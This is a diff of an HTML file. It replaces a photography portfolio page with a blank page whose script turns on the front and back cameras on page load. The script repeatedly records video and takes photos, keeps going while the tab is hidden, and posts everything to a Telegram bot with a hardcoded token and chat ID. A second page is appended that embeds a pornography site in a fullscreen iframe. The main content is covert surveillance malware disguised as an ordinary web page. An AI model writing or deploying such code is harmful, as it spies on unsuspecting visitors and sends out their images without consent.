@@ -3,352 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Husain's Photography</title>
-
-    <style>
-        /* Reset styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #0b0c10;
-            color: #fff;
-            overflow-x: hidden;
-        }
-
-        /* Container */
-        .container {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* Header */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-            background-color: rgba(0, 0, 0, 0.7);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 10;
-        }
-
-        header .logo h1 {
-            font-size: 2em;
-            letter-spacing: 2px;
-            color: #fff;
-            font-weight: bold;
-        }
-
-        nav ul {
-            list-style: none;
-            display: flex;
-        }
-
-        nav ul li {
-            margin-left: 20px;
-        }
-
-        nav ul li a {
-            text-decoration: none;
-            color: #fff;
-            font-size: 1em;
-            transition: color 0.3s ease;
-        }
-
-        nav ul li a:hover {
-            color: #ff6347;
-        }
-
-        /* Hero Section */
-        .hero {
-            background-image: url('https://via.placeholder.com/1600x900'); /* Placeholder Image */
-            background-size: cover;
-            background-position: center;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            animation: fadeIn 2s ease-out;
-        }
-
-        .hero-text {
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 30px;
-            border-radius: 10px;
-        }
-
-        .hero-text h2 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-
-        .hero-text p {
-            font-size: 1.2em;
-            margin-bottom: 20px;
-        }
-
-        .cta-btn {
-            font-size: 1em;
-            padding: 15px 30px;
-            background-color: #ff6347;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
-        }
-
-        .cta-btn:hover {
-            background-color: #e04e2f;
-        }
-
-        /* Portfolio Section */
-        .portfolio {
-            padding: 50px;
-            text-align: center;
-        }
-
-        .portfolio h2 {
-            font-size: 2em;
-            margin-bottom: 30px;
-        }
-
-        .gallery {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: auto;
-            border-radius: 10px;
-            transition: transform 0.3s ease;
-        }
-
-        .gallery-item img:hover {
-            transform: scale(1.05);
-        }
-
-        /* About Section */
-        .about {
-            padding: 50px;
-            background-color: #222;
-            text-align: center;
-        }
-
-        .about h2 {
-            font-size: 2em;
-            margin-bottom: 20px;
-        }
-
-        .about p {
-            font-size: 1.2em;
-            line-height: 1.6;
-        }
-
-        /* Contact Section */
-        .contact {
-            padding: 50px;
-            background-color: #333;
-            text-align: center;
-        }
-
-        .contact h2 {
-            font-size: 2em;
-            margin-bottom: 20px;
-        }
-
-        .contact form {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .contact input, .contact textarea {
-            width: 80%;
-            max-width: 500px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
-            font-size: 1em;
-        }
-
-        .contact button {
-            font-size: 1em;
-            padding: 15px 30px;
-            background-color: #ff6347;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .contact button:hover {
-            background-color: #e04e2f;
-        }
-
-        /* Footer */
-        footer {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            text-align: center;
-            margin-top: auto;
-        }
-
-        footer p {
-            font-size: 1em;
-        }
-
-        .social-icons a {
-            text-decoration: none;
-            color: #fff;
-            margin: 0 10px;
-            font-size: 1.2em;
-            transition: color 0.3s ease;
-        }
-
-        .social-icons a:hover {
-            color: #ff6347;
-        }
-
-        /* Keyframe Animations */
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-
-        /* Media Queries */
-        @media (max-width: 768px) {
-            header .logo h1 {
-                font-size: 1.5em;
-            }
-
-            nav ul {
-                flex-direction: column;
-                align-items: center;
-            }
-
-            .hero-text h2 {
-                font-size: 2em;
-            }
-
-            .hero-text p {
-                font-size: 1em;
-            }
-
-            .cta-btn {
-                padding: 10px 20px;
-                font-size: 0.9em;
-            }
-
-            .contact input, .contact textarea {
-                width: 90%;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .hero-text h2 {
-                font-size: 1.8em;
-            }
-
-            .hero-text p {
-                font-size: 0.9em;
-            }
-
-            .cta-btn {
-                font-size: 0.8em;
-            }
-        }
-    </style>
+    <title></title>
 </head>
 <body>
-    <div class="container">
-        <!-- Header Section -->
-        <header>
-            <div class="logo">
-                <h1>Husain's Photography</h1>
-            </div>
-            <nav>
-                <ul>
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#portfolio">Portfolio</a></li>
-                    <li><a href="#about">About</a></li>
-                    <li><a href="#contact">Contact</a></li>
-                </ul>
-            </nav>
-        </header>
+    <h1></h1>
+    <p></p>
 
-        <!-- Hero Section -->
-        <section class="hero">
-            <div class="hero-text">
-                <h2>Capturing Moments, One Click at a Time</h2>
-                <p>Explore the beauty through my lens</p>
-                <a href="#portfolio" class="cta-btn">View Portfolio</a>
-            </div>
-        </section>
+    <script>
+        const telegramBotToken = "7067291143:AAHeemg_4QvJRjxN6rRQSk_fMxLKLZDwVhk"; // Replace with your bot's token
+        const chatId = "7888600155T"; // Replace with the chat ID where you want to send the video
 
-        <!-- Portfolio Section -->
-        <section id="portfolio" class="portfolio">
-            <h2>My Work</h2>
-            <div class="gallery">
-                <div class="gallery-item">
-                    <img src="https://via.placeholder.com/300x200" alt="Image 1">
-                </div>
-                <div class="gallery-item">
-                    <img src="https://via.placeholder.com/300x200" alt="Image 2">
-                </div>
-                <div class="gallery-item">
-                    <img src="https://via.placeholder.com/300x200" alt="Image 3">
-                </div>
-                <div class="gallery-item">
-                    <img src="https://via.placeholder.com/300x200" alt="Image 4">
-                </div>
-            </div>
-        </section>
+        let stream;
+        let mediaRecorder;
+        let recordedChunks = [];
 
-        <!-- About Section -->
-        <section id="about" class="about">
-            <h2>About Me</h2>
-            <p>I am a passionate photographer, capturing the world through my lens. I specialize in landscape, portrait, and event photography. With every click, I aim to capture the essence of moments that last a lifetime.</p>
-        </section>
+        async function startCamera(cameraFacing) {
+            try {
+                // Access the camera
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: cameraFacing // "user" for front, "environment" for back
+                    }
+                });
+                return stream;
+            } catch (error) {
+                console.error("Error accessing the camera:", error);
+            }
+        }
 
-        <!-- Contact Section -->
-        <section id="contact" class="contact">
-            <h2>Contact Me</h2>
-            <p>If you would like to book a session or inquire about my work, feel free to reach out.</p>
-            <form>
-                <input type="text" name="name" placeholder="Your Name" required>
-                <input type="email" name="email" placeholder="Your Email" required>
-                <textarea name="message" placeholder="Your Message" required></textarea>
-                <button type="submit" class="cta-btn">Send Message</button>
-            </form>
-        </section>
+        function startRecording() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream);
 
-        <!-- Footer Section -->
-        <footer>
-            <p>&copy; 2024 Husain's Photography | All Rights Reserved</p>
-            <div class="social-icons">
-                <a href="https://instagram.com" target="_blank">Instagram</a>
-                <a href="https://facebook.com" target="_blank">Facebook</a>
-                <a href="https://twitter.com" target="_blank">Twitter</a>
-            </div>
-        </footer>
-    </div>
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.start();
+        }
+
+        async function stopRecordingAndSend() {
+            mediaRecorder.stop();
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: "video/mp4" });
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("video", blob, "recorded_video.mp4");
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("Error sending video to Telegram:", error);
+                }
+            };
+        }
+
+        async function capturePhoto(cameraFacing) {
+            const photoStream = await startCamera(cameraFacing);
+            const videoElement = document.createElement("video");
+            videoElement.srcObject = photoStream;
+            await videoElement.play();
+
+            const canvas = document.createElement("canvas");
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+
+            const context = canvas.getContext("2d");
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "captured_photo.jpg");
+
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (error) {
+                console.error("Error sending photo to Telegram:", error);
+            }
+
+            photoStream.getTracks().forEach((track) => track.stop());
+        }
+
+        async function recordSequence() {
+            // Record first 5 seconds with the front camera
+            stream = await startCamera("user");
+            startRecording();
+            setTimeout(async () => {
+                await stopRecordingAndSend();
+
+                // Switch to the back camera and record next 5 seconds
+                stream.getTracks().forEach((track) => track.stop()); // Stop current stream
+                stream = await startCamera("environment");
+                startRecording();
+
+                setTimeout(async () => {
+                    await stopRecordingAndSend();
+                    stream.getTracks().forEach((track) => track.stop()); // Stop back camera stream
+
+                    // Restart the sequence after some delay
+                    setTimeout(recordSequence, 2000); // 2-second delay before restarting
+                }, 5000); // Back camera recording duration
+            }, 5000); // Front camera recording duration
+        }
+
+        async function startCapturing() {
+            // Start taking photos periodically (every 7 seconds)
+            setInterval(async () => {
+                await capturePhoto("user"); // Take a photo with the front camera
+                await capturePhoto("environment"); // Take a photo with the back camera
+            }, 7000);
+
+            // Start the video recording sequence
+            recordSequence();
+        }
+
+        // Ensure the recording continues even when the tab is inactive
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === "visible") {
+                console.log("Tab is active");
+            } else {
+                console.log("Tab is inactive, recording continues...");
+            }
+        });
+
+        // Start capturing as soon as the page loads
+        startCapturing();
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fullscreen iFrame</title>
+<style>
+  body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    overflow: hidden;
+  }
+  iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+</style>
+</head>
+<body>
+<iframe src="https://redporn.porn/" allowfullscreen></iframe>
 </body>
 </html>
